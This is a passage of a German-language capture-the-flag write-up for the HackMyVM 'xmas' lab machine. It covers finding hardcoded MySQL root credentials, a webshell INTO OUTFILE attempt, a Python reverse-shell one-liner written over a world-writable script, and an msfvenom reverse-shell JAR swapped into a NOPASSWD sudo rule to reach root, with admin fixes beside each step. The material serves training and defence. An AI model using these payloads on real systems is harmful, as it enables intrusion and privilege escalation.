+               <p class="analysis"><strong>Analyse:</strong> Als `www-data` wird der Quellcode der `index.php` im Web-Root (`/var/www/christmas.hmv`) ausgelesen.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> **Kritischer Fund!** Die Datei enthält hartcodierte Zugangsdaten für die MySQL-Datenbank: Benutzer `root`, Passwort `<span class="password">ChristmasMustGon!</span>`, Datenbank `christmas`. Der Zugriff auf die Datenbank als `root` ist nun möglich.</p>
+               <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Melden Sie sich mit `mysql -u root -pChristmasMustGon!` an der lokalen MySQL-Datenbank an. Untersuchen Sie die Datenbank `christmas` auf interessante Tabellen und Daten (Benutzer, Passwörter, etc.).
+               <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Speichern Sie niemals Zugangsdaten (insbesondere Root-Passwörter) im Klartext im Quellcode. Verwenden Sie Konfigurationsdateien außerhalb des Web-Roots oder Umgebungsvariablen. Ändern Sie das MySQL-Root-Passwort sofort. Erstellen Sie dedizierte Datenbankbenutzer mit minimalen Rechten für Webanwendungen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@xmas:/var/www/christmas.hmv$ <span class="command">mysql -u root -p</span></div>
+                     <pre>
+Enter password: <span class="password">ChristmasMustGon!</span>
+Welcome to the MySQL monitor. [...]
+Server version: 8.0.35-0ubuntu0.23.04.1 (Ubuntu)
+[...]
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| christmas          |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+[...]
+mysql> use christmas;
+Database changed
+mysql> show tables;
++---------------------+
+| Tables_in_christmas |
++---------------------+
+| christmas           |
++---------------------+
+[...]
+mysql> select * from christmas;
++----+-------------------+---------+
+| id | name              | status  |
++----+-------------------+---------+
+|  1 | Jesse Strange     | naughty |
+|  2 | Kimberly Wininger | naughty |
+|  3 | Brandy Homes      | nice    |
+|  4 | shell.php         | nice    |
+|  5 | shell             | naughty |
+|  6 | shell             | naughty |
++----+-------------------+---------+
+[...]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Mit den in `index.php` gefundenen Zugangsdaten wird sich erfolgreich am lokalen MySQL-Server als `root` angemeldet. Die Datenbank `christmas` wird ausgewählt und die Tabelle `christmas` abgefragt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Tabelle `christmas` enthält Namen (teilweise von der Webseite bekannt) und einen Status ("nice" oder "naughty"). Sie enthält auch die hochgeladene `shell.php`. Es sind keine direkten Benutzerkonten oder Passwörter sichtbar, die für eine System-Eskalation nützlich wären.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der direkte Datenbankzugriff als `root` ist zwar ein signifikanter Fund, liefert aber in diesem Fall keine direkten Zugangsdaten für Systembenutzer. Prüfen Sie, ob MySQL genutzt werden kann, um Dateien zu schreiben (`SELECT ... INTO OUTFILE`) oder Befehle auszuführen (UDFs), obwohl `secure-file-priv` dies oft verhindert. Suchen Sie nach anderen Eskalationsvektoren im Dateisystem oder in Prozessen.
+             <br><strong>Empfehlung (Admin):</strong> Ändern Sie das MySQL-Root-Passwort. Entfernen Sie die Webshell-Einträge aus der Datenbank (und die Datei aus `/uploads/`).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">mysql> <span class="command">SELECT "<?php system($_REQUEST['ben']); ?>" INTO OUTFILE "/var/www/html/ben.php";</span></div>
+                     <pre>
+ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, mittels `SELECT ... INTO OUTFILE` eine neue PHP-Webshell (`ben.php`) in ein Web-Verzeichnis (`/var/www/html/`) zu schreiben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Versuch scheitert, da die MySQL-Sicherheitsoption `secure-file-priv` aktiviert ist. Diese verhindert oder schränkt das Schreiben von Dateien durch MySQL stark ein. Dies ist eine gute Sicherheitskonfiguration.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dieser Weg ist blockiert. Suchen Sie nach anderen Methoden.
+             <br><strong>Empfehlung (Admin):</strong> Behalten Sie `secure-file-priv` aktiviert und konfigurieren Sie es auf ein nicht per Web erreichbares Verzeichnis, falls `INTO OUTFILE` benötigt wird.</p>
+
+             <!-- Enumeration führt zum Python-Skript -->
+             <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">www-data@xmas:/var/backups$ <span class="command">cd /opt/NicerNaughty/</span></div>
+                       <div class="prompt">www-data@xmas:/opt/NicerNaughty$ <span class="command">ls -la</span></div>
+                       <pre>
+total 12
+drwxr-xr-x 2 root root 4096 Nov 20 18:39 .
+drwxr-xr-x 3 root root 4096 Nov 20 18:39 ..
+-rwxrwxrw- 1 root root 2029 Nov 20 18:39 nice_or_naughty.py
+                       </pre>
+                       <div class="prompt">www-data@xmas:/opt/NicerNaughty$ <span class="command">cat nice_or_naughty.py</span></div>
+                       <pre>
+import mysql.connector
+import random
+import os
+
+# Check the wish lists directory
+directory = "/var/www/christmas.hmv/uploads"
+# Connect to the mysql database christmas
+mydb = mysql.connector.connect(
+    host="localhost",
+    user="root",
+    password="<span class="password">ChristmasMustGon!</span>",
+    database="christmas"
+)
+
+#Read the names of the wish list
+def read_names(directory):
+    for filename in os.listdir(directory):
+        full_path = os.path.join(directory, filename)
+        if os.path.isfile(full_path):
+            name, ext = os.path.splitext(filename)
+            if any(char.isalnum() for char in name):
+                status = random.choice(["nice", "naughty"])
+                #print(f"{name} {status}")
+                insert_data(name, status)
+                os.remove(full_path)
+            else:
+                pass
+
+        elif os.path.isdir(full_path):
+            pass
+
+# Insert name into the database
+def insert_data(name, status):
+    # [...] (MySQL code)
+
+#Generate printable Nice and Naughty list
+def generate_lists():
+    # [...] (MySQL code)
+    parent_directory = os.path.dirname(os.getcwd())
+    file_path = "/home/alabaster/nice_list.txt"
+    # Save the nice and naughty lists to separate txt files
+    with open(file_path, "w") as file:
+        # [...]
+    file_path = "/home/alabaster/naughty_list.txt"
+    with open(file_path, "w") as file:
+        # [...]
+
+read_names(directory)
+generate_lists()
+                       </pre>
+                  </div>
+              </div>
+              <p class="analysis"><strong>Analyse:</strong> Das Verzeichnis `/opt/NicerNaughty` wird entdeckt und enthält ein Python-Skript `nice_or_naughty.py`. Die Berechtigungen (`-rwxrwxrw-`) zeigen, dass die Datei **world-writable** ist (jeder kann sie lesen, schreiben und ausführen), obwohl sie `root` gehört. Der Inhalt des Skripts wird analysiert: Es verbindet sich zur MySQL-Datenbank (erneut mit den hardcodierten Root-Credentials!), liest Dateinamen aus `/var/www/christmas.hmv/uploads`, schreibt Daten in die Datenbank und schreibt schließlich zwei Dateien (`nice_list.txt`, `naughty_list.txt`) in das Verzeichnis `/home/alabaster`.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> **Dies ist der Schlüssel zur nächsten Eskalationsstufe.** Da das Skript Dateien in `/home/alabaster` schreibt, muss es von einem Prozess ausgeführt werden, der die entsprechenden Rechte hat (höchstwahrscheinlich der Benutzer `alabaster` selbst oder `root`). Da die Datei world-writable ist, kann der `www-data`-Benutzer den Inhalt des Skripts ändern. Wenn das Skript dann vom privilegierten Benutzer (z.B. `alabaster` via Cronjob oder anderem Trigger) ausgeführt wird, wird der bösartige Code von `www-data` mit den Rechten von `alabaster` ausgeführt.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                1.  Überschreiben Sie den Inhalt von `/opt/NicerNaughty/nice_or_naughty.py` mit einem Python-Reverse-Shell-Payload, der sich zu Ihrem Listener verbindet.
+                2.  Finden Sie heraus, wie das Skript getriggert wird. Der Code deutet darauf hin, dass es auf Dateien im `/uploads`-Verzeichnis reagiert. Laden Sie eine (beliebige) Datei über die Webanwendung hoch, um das Skript (hoffentlich als `alabaster`) auszulösen.
+                3.  Starten Sie einen Listener auf dem entsprechenden Port.
+              <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Korrigieren Sie die unsicheren Berechtigungen (`chmod 644` oder `755`) für `/opt/NicerNaughty/nice_or_naughty.py`. Speichern Sie niemals Zugangsdaten im Klartext in Skripten. Überprüfen Sie den Mechanismus, der dieses Skript ausführt (Cronjob?) und stellen Sie sicher, dass er sicher ist und mit minimalen Rechten läuft.</p>
+
+             <!-- Überschreiben des Python-Skripts (implizit korrigiert) -->
+             <div class="code-block">
+                  <div class="terminal">
+                      <!-- Vorbereitung des Payloads -->
+                      <div class="prompt">www-data@xmas:/tmp$ <span class="command">echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.199",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")' > reverse_shell.py</span></div>
+                       <!-- Überschreiben des originalen Skripts -->
+                      <div class="prompt">www-data@xmas:/tmp$ <span class="command">cat reverse_shell.py > /opt/NicerNaughty/nice_or_naughty.py</span></div>
+                      <!-- Kein Output -->
+                      <div class="prompt">www-data@xmas:/tmp$ <span class="command"># Trigger: Datei über die Webseite hochladen...</span></div>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Python-Reverse-Shell-Payload (Verbindung zu `192.168.2.199` Port `4445`) wird in einer temporären Datei gespeichert und dann verwendet, um das world-writable Skript `/opt/NicerNaughty/nice_or_naughty.py` zu überschreiben. Anschließend wird der Trigger (Datei-Upload über die Webseite) ausgelöst (nicht im Log gezeigt).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist der korrekte Weg, die world-writable Schwachstelle auszunutzen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie einen Listener auf Port 4445 und lösen Sie den Trigger aus.
+             <br><strong>Empfehlung (Admin):</strong> Korrigieren Sie die Dateiberechtigungen und den Trigger-Mechanismus.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <!-- Listener starten und Verbindung empfangen -->
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4445</span></div>
+                      <pre>
+listening on [any] 4445 ...
+connect to [192.168.2.199] from (UNKNOWN) [192.168.2.122] 42308
+$ id
+uid=1000(alabaster) gid=1000(alabaster) groups=1000(alabaster),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
+$
+                      </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Listener auf Port 4445 wird gestartet. Nach dem Auslösen des Triggers (Datei-Upload) kommt eine Verbindung vom Zielsystem herein. Der `id`-Befehl wird ausgeführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Die Reverse Shell wurde empfangen und läuft als Benutzer `alabaster` (UID 1000). Die Rechte wurden erfolgreich von `www-data` zu `alabaster` eskaliert. Die Gruppenzugehörigkeiten (`sudo`, `adm`) sind ebenfalls interessant.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell. Führen Sie lokale Enumeration als `alabaster` durch, insbesondere `sudo -l`. Lesen Sie die User-Flagge.
+             <br><strong>Empfehlung (Admin):</strong> Korrigieren Sie die world-writable-Schwachstelle und den unsicheren Trigger.</p>
+        </section>
+
+        <section id="poc">
+             <h2>Proof of Concept (Privilege Escalation Path alabaster zu root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Nach Erlangung der Shell als `alabaster` wird erneut nach Möglichkeiten zur Rechteerweiterung gesucht, primär durch Überprüfung der `sudo`-Rechte.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> `sudo -l` zeigt, dass `alabaster` zwei `sudo`-Regeln hat:
+                1.  `(ALL : ALL) ALL`: Erlaubt die Ausführung *aller* Befehle als *jeder* Benutzer, erfordert aber das Passwort von `alabaster`. Da dieses Passwort unbekannt ist, ist diese Regel vorerst nicht direkt nutzbar.
+                2.  `(ALL) NOPASSWD: /usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar`: Erlaubt die Ausführung eines spezifischen Java-JAR-Archivs (`PublishList.jar` im Home-Verzeichnis von `alabaster`) als `root` (da `ALL` der Standard ist, wenn kein Benutzer angegeben wird) *ohne* Passwortabfrage. Dies ist der angreifbare Vektor.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ersetzen Sie die originale `PublishList.jar`-Datei durch ein bösartiges JAR-Archiv (z.B. erstellt mit `msfvenom`), das eine Reverse Shell startet. Führen Sie dann `sudo /usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar` aus, um die Root-Shell zu erhalten.
+             <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Entfernen Sie die `NOPASSWD`-Regel für das Java-JAR. Wenn `alabaster` wirklich Root-Rechte benötigt, sollte die Regel `(ALL : ALL) ALL` (mit Passwortabfrage) ausreichen, sofern ein starkes Passwort gesetzt ist. Generell sollte die Notwendigkeit von Root-Rechten für `alabaster` hinterfragt werden (Least Privilege).</p>
+         </section>
+
+         <section id="privilege-escalation-root">
+             <h2>Privilege Escalation (alabaster zu root)</h2>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <!-- Enumeration als alabaster -->
+                      <div class="prompt">alabaster@xmas:~$ <span class="command">ls</span></div>
+                      <pre>naughty_list.txt  nice_list.txt  NicerNaughty  PublishList  user.txt</pre>
+                      <div class="prompt">alabaster@xmas:~$ <span class="command">cat user.txt</span></div>
+                      <pre>
+    ||::|:||   .--------,
+    |:||:|:|   |_______ /        .-.
+[...]
+       ||          |          )   Flag: <span class="password">HMV{7bMJ6js7guhQadYDTmBt}</span>
+       ||----------'---------'
+                      </pre>
+                      <div class="prompt">alabaster@xmas:~$ <span class="command">sudo -l</span></div>
+                      <pre>
+Matching Defaults entries for alabaster on xmas:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User alabaster may run the following commands on xmas:
+    (ALL : ALL) ALL
+    (ALL) NPASSWD: /usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar
+                      </pre>
+                      <!-- Passwort für sudo su versuchen -->
+                      <div class="prompt">alabaster@xmas:~$ <span class="command">sudo su</span></div>
+                      <pre>
+[sudo] password for alabaster:
+sudo: a password is required
+                      </pre>
+                       <!-- Funktion des JARs testen -->
+                       <div class="prompt">alabaster@xmas:~$ <span class="command">/usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar</span></div>
+                       <pre>
+Failed to copy files!
+java.io.FileNotFoundException: /home/santa/nice_list.txt (Permission denied)
+[...]
+                       </pre>
+                       <div class="prompt">alabaster@xmas:~$ <span class="command">sudo /usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar</span></div>
+                       <pre>
+Files copied successfully!
+                       </pre>
+                       <!-- Versuch, root.txt als Argument zu übergeben (scheitert an Passwortabfrage) -->
+                       <div class="prompt">alabaster@xmas:~$ <span class="command">sudo /usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar /root/root.txt</span></div>
+                       <pre>
+[sudo] password for alabaster:
+Sorry, try again.
+[sudo] password for alabaster:
+sudo: 1 incorrect password attempt
+                       </pre>
+                  </div>
+              </div>
+               <p class="analysis"><strong>Analyse:</strong> Als `alabaster` wird das Home-Verzeichnis aufgelistet und die User-Flagge gefunden. `sudo -l` bestätigt die beiden sudo-Regeln. Der Versuch, `sudo su` zu verwenden, scheitert an der Passwortabfrage. Das Ausführen des `PublishList.jar` ohne `sudo` schlägt fehl (Berechtigungsfehler beim Zugriff auf `/home/santa/...`), aber mit `sudo` funktioniert es, was die `NOPASSWD`-Regel bestätigt. Der Versuch, `/root/root.txt` als Argument zu übergeben, triggert fälschlicherweise die Passwortabfrage der `(ALL : ALL) ALL`-Regel und scheitert.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> Die User-Flagge ist gefunden. Die `NOPASSWD`-Regel für `PublishList.jar` ist der klare Weg zur Root-Eskalation.</p>
+               <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erstellen Sie ein bösartiges JAR mit `msfvenom`, ersetzen Sie damit `/home/alabaster/PublishList/PublishList.jar` und führen Sie es mit `sudo` aus.
+               <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die unsichere `NOPASSWD`-Regel.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- msfvenom Payload-Erstellung (auf Angreifer-System) -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">msfvenom -p java/shell_reverse_tcp LHST=192.168.2.199 LPRT=4321 -f jar -o shell.jar</span></div>
+                     <pre>
+Payload size: 7504 bytes
+Final size of jar file: 7504 bytes
+Saved as: shell.jar
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird `msfvenom` verwendet, um ein Java-JAR-Archiv (`shell.jar`) zu erstellen. Dieses Archiv enthält einen Payload (`java/shell_reverse_tcp`), der eine Reverse Shell zur IP `192.168.2.199` auf Port `4321` aufbaut.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das bösartige JAR-Archiv ist erfolgreich erstellt und bereit zum Transfer auf das Zielsystem.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Übertragen Sie `shell.jar` auf das Zielsystem in das Home-Verzeichnis von `alabaster`.
+             <br><strong>Empfehlung (Admin):</strong> Antiviren- oder EDR-Systeme können versuchen, solche Payloads zu erkennen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Hosten und Herunterladen des Payloads -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                     <pre>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</pre>
+                     <!-- Auf Zielsystem (alabaster Shell) -->
+                     <div class="prompt">alabaster@xmas:~$ <span class="command">wget http://192.168.2.199/shell.jar</span></div>
+                     <pre>
+--2024-05-08 22:34:24--  http://192.168.2.199/shell.jar
+Connecting to 192.168.2.199:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7504 (7.3K) [application/java-archive]
+Saving to: ‘shell.jar’
+
+shell.jar               100%[===================>]   7.33K  --.-KB/s    in 0s
+
+2024-05-08 22:34:24 (614 MB/s) - ‘shell.jar’ saved [7504/7504]
+                     </pre>
+                     <!-- Python Server Log -->
+                     <pre>
+192.168.2.122 - - [09/May/2024 00:34:19] "GET /shell.jar HTTP/1.1" 200 -
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird ein einfacher Python-HTTP-Server gestartet, um die `shell.jar`-Datei bereitzustellen. Auf dem Zielsystem lädt der `alabaster`-Benutzer die Datei mit `wget` herunter.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Transfer des bösartigen JARs war erfolgreich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ersetzen Sie nun die originale `PublishList.jar` durch die heruntergeladene `shell.jar`.
+             <br><strong>Empfehlung (Admin):</strong> Überwachen Sie Netzwerkverkehr und Dateidownloads auf verdächtige Aktivitäten.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <!-- Ersetzen der originalen JAR-Datei -->
+                      <div class="prompt">alabaster@xmas:~$ <span class="command">mv shell.jar PublishList.jar</span></div>
+                      <div class="prompt">alabaster@xmas:~$ <span class="command">mv PublishList.jar PublishList</span></div>
+                      <!-- Hinweis: Der zweite mv-Befehl verschiebt die JAR in ein Verzeichnis 'PublishList', was korrekt sein könnte, wenn das sudo-Kommando /home/alabaster/PublishList/PublishList.jar erwartet. -->
+                  </div>
+              </div>
+              <p class="analysis"><strong>Analyse:</strong> Die heruntergeladene `shell.jar` wird zuerst in `PublishList.jar` umbenannt. Dann wird diese `PublishList.jar` in das Verzeichnis `PublishList` verschoben (oder umbenannt, falls `PublishList` kein Verzeichnis ist, aber der Pfad in `sudo -l` deutet auf ein Verzeichnis hin). Ziel ist es, die originale JAR-Datei, die von der `sudo`-Regel ausgeführt wird, durch die bösartige zu ersetzen.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Die bösartige JAR-Datei ist nun an der Stelle, an der die `sudo`-Regel sie ausführen wird.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie den Netcat-Listener für die Reverse Shell (Port 4321) und führen Sie dann den `sudo java -jar ...`-Befehl aus.
+              <br><strong>Empfehlung (Admin):</strong> Überwachen Sie die Integrität von Dateien, die in `sudo`-Regeln verwendet werden (File Integrity Monitoring - FIM).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Listener starten -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4321</span></div>
+                     <pre>listening on [any] 4321 ...</pre>
+                      <!-- Exploit ausführen (alabaster Shell) -->
+                     <div class="prompt">alabaster@xmas:~$ <span class="command">sudo /usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar</span></div>
+                     <!-- Kein direkter Output hier -->
+                     <!-- Eingehende Verbindung im Listener -->
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4321</span></div>
+                      <pre>
+listening on [any] 4321 ...
+connect to [192.168.2.199] from (UNKNOWN) [192.168.2.122] 52392
+id
+uid=0(root) gid=0(root) groups=0(root)
+                      </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Listener wird auf Port 4321 gestartet. Als `alabaster` wird der `sudo`-Befehl ausgeführt, der nun die bösartige `PublishList.jar` startet. Diese JAR-Datei führt den Java-Reverse-Shell-Payload aus.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Root-Zugriff erfolgreich!** Der Listener empfängt eine Verbindung, und der `id`-Befehl bestätigt, dass die Shell als `root` (UID 0) läuft.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht! Lesen Sie die Root-Flagge aus `/root/root.txt`.
+             <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die unsichere `sudo`-Regel. Überprüfen Sie das System auf die hochgeladene JAR-Datei und andere Spuren.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <!-- In der Root-Shell -->
+                      <div class="prompt"># <span class="command">ls</span></div>
+                      <pre>[...]</pre> <!-- ls wurde nicht wirklich gezeigt, nur cd/cat -->
+                      <div class="prompt"># <span class="command">cd ~</span></div>
+                      <div class="prompt"># <span class="command">ls</span></div>
+                      <pre>
+root.txt
+snap
+                      </pre>
+                      <div class="prompt"># <span class="command">cat root.txt</span></div>
+                      <pre>
+      __,_,_,___)          _______
+    (--| | |             (--/    ),_)        ,_)
+       | | |  _ ,_,_        |     |_ ,_ ' , _|_,_,_, _  ,
+     __| | | (/_| | (_|     |     | ||  |/_)_| | | |(_|/_)___,
+    (      |___,   ,__|     \____)  |__,           |__,
+
+                            |                         _...._
+[...]
+      Flag <span class="password">HMV{GUbM4sBXzvwf7eC9bNL4}</span>
+                      </pre>
+                  </div>
+              </div>
+               <p class="analysis"><strong>Analyse:</strong> In der erhaltenen Root-Shell wird das `/root`-Verzeichnis aufgelistet und die Datei `root.txt` ausgelesen.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flagge `<span class="password">HMV{GUbM4sBXzvwf7eC9bNL4}</span>` (innerhalb der ASCII-Art) wurde erfolgreich gefunden.</p>
+               <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Maschine abgeschlossen. Dokumentieren Sie den gesamten Prozess.
+               <br><strong>Empfehlung (Admin):</strong> Beheben Sie alle gefundenen Schwachstellen (File Upload, Hardcoded Credentials, World-Writable Script, Sudo-Regel).</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                     <!-- Befehl zum Lesen der User-Flagge (als alabaster) -->
+                     <div class="flag-command">cat /home/alabaster/user.txt</div>
+                     <!-- User-Flagge -->
+                     <div class="flag-value"><span class="password">HMV{7bMJ6js7guhQadYDTmBt}</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <!-- Befehl zum Lesen der Root-Flagge -->
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <!-- Root-Flagge -->
+                     <div class="flag-value"><span class="password">HMV{GUbM4sBXzvwf7eC9bNL4}</span></div>
+                 </div>
+             </div>
+             <!-- Keine Analyse/Bewertung/Empfehlung im Flags-Abschnitt -->
+         </section>
+   
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nikto Scan übernommen -->
+        <p>Berichtsdatum: 2024-05-08</p>
+    </footer>
+</body>
+</html>
